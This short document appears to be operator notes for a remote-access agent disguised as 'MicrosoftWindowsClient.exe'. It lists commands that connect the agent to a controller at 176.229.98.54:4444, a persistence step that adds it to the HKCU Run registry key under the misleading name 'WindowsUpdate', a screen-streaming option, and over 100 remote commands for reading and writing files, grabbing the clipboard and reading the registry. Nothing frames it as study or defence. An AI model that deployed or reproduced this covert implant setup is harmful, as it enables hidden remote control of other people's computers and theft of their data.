Agent - House B (TLS-encrypted, 100+ commands)
===============================================
Run:
  MicrosoftWindowsClient.exe -controller 176.229.98.54:4444 -ca server.crt
  MicrosoftWindowsClient.exe -controller 176.229.98.54:4444 -insecure   (test)
  MicrosoftWindowsClient.exe -controller 176.229.98.54:4444 -ca server.crt -fps 1  (stream)

Persistence:
  MicrosoftWindowsClient.exe -persist   (HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate)
  # or PowerShell: Set-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name WindowsUpdate -Value ""C:\path\MicrosoftWindowsClient.exe" -controller 176.229.98.54:4444 -ca server.crt"

Commands: help, list-commands, get-system-info, get-cpu-info, get-memory-usage, list-directory, read-file, write-file, get-file-hash, mouse-move, clipboard-get/set, reg-read, get-services, get-processes, get-public-ip, etc. (100+ via commands.KnownCommands)

Cert: server.crt must match controller's server.crt (SAN includes 176.229.98.54)
